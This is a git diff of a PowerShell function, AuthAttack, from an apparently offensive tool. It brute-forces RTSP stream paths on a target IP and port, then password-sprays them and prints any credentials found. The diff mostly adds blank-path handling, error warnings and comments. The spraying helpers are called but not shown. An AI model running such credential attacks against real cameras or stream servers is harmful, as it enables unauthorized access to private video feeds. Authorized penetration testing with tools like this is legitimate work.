@@ -852,11 +852,10 @@ function AuthAttack {
         [Parameter(Mandatory = $False)]
         [string]$Path
     )
+
     $ipAndPort = $Target.Split(':')
     $ip = $ipAndPort[0]
     $port = $ipAndPort[1]
-
-
 
     try {
         $tcpClient = New-Object System.Net.Sockets.TcpClient
@@ -884,24 +883,40 @@ function AuthAttack {
             Write-Host -ForegroundColor Red "$ip`:$port"
             return
         }
-    } 
+    }
     catch {
-    
+        Write-Warning "An error occurred: $_"
+        return
     }
 
-
+    # Check if the Path parameter was provided and if it's blank or "/"
     if ($PSBoundParameters.ContainsKey('Path')) {
-        # Path parameter is provided, create a PSCustomObject directly
-        $getAuth = Get-AuthType -OpenPorts $cliaddress
-        $authRequiredPaths = [PSCustomObject]@{
-            IPAddress = $ip
-            Port      = $port
-            Path      = $Path
-            AuthType  = $getAuth.authType
+        if ($Path -eq "" -or $Path -eq "/") {
+            # Handle the case where Path is explicitly blank or "/"
+            Write-Host "Testing blank path..." -ForegroundColor Yellow
+
+            $getAuth = Get-AuthType -OpenPorts $cliaddress
+            $authRequiredPaths = [PSCustomObject]@{
+                IPAddress = $ip
+                Port      = $port
+                Path      = ""  # Set blank path for testing
+                AuthType  = $getAuth.authType
+            }
+        }
+        else {
+            # Handle case where a valid path is provided
+            $getAuth = Get-AuthType -OpenPorts $cliaddress
+            $authRequiredPaths = [PSCustomObject]@{
+                IPAddress = $ip
+                Port      = $port
+                Path      = $Path
+                AuthType  = $getAuth.authType
+            }
         }
     }
     else {
-        # Path parameter is not provided, use the default behavior
+        # No Path provided, brute force the paths
+        Write-Host "No Path provided, brute-forcing paths..." -ForegroundColor Yellow
         $getAuth = Get-AuthType -OpenPorts $cliaddress
         $AuthConstruct = [PSCustomObject]@{
             IPAddress = $ip
@@ -911,7 +926,7 @@ function AuthAttack {
         $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $AuthConstruct
     }
 
-
+    # Continue with password spraying logic...
     if ($authRequiredPaths -is [System.Array]) {
         if ($authRequiredPaths.Count -gt 0) {
             Write-Host "=========================================================`r`n"
@@ -934,7 +949,7 @@ function AuthAttack {
                     Write-Host -ForegroundColor Yellow -NoNewline "====="
                     Write-Host -NoNewline " Found Credentials "
                     Write-Host -ForegroundColor Yellow "====="
-                
+
                     Write-Host -NoNewline -ForegroundColor Green  "[+] "
                     $authString = $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
                     Write-Host "Path: $authString"
@@ -946,7 +961,6 @@ function AuthAttack {
                     Write-Host -NoNewline "$fullRTSPString"
                     Write-Host -ForegroundColor Green  " <<<`r`n"
 
-
                     # Remove the current IP:Port combination from the array
                     $authRequiredPaths = $authRequiredPaths | Where-Object { ($_.IPAddress -ne $authPath.IPAddress) -or ($_.Port -ne $authPath.Port) }
                 }
@@ -954,20 +968,14 @@ function AuthAttack {
                     $index++
                 }
             }
-
-            #return $validCredentials
         }
     } elseif ($null -eq $authRequiredPaths) {
-
         Write-Host -NoNewline -ForegroundColor Green "[+]"
         Write-Host " No Auth Detected, See results above.`r`n"
-
     } else {
-        # $authRequiredPaths is a single object, handle it separately
         Write-Host "Beginning Password Spray:`r`n"
 
         $result = Get-ValidRTSPCredential -IP $authRequiredPaths.IPAddress -Port $authRequiredPaths.Port -Path $authRequiredPaths.Path -authType $authRequiredPaths.authType
-        
 
         if ($result.CredentialFound) {
             $validCredentials += [PSCustomObject]@{
@@ -991,14 +999,13 @@ function AuthAttack {
             Write-Host -NoNewline -ForegroundColor Green  ">>> "
             Write-Host -NoNewline "$fullRTSPString"
             Write-Host -ForegroundColor Green  " <<<`r`n"
-
-            #return $validCredentials
         }
     }
 
     Write-Host "Scan completed.`r`n" -ForegroundColor Green
     Write-Host "=========================================================`r`n"
 }
+
 
 function FullAuto {
     [CmdletBinding()]
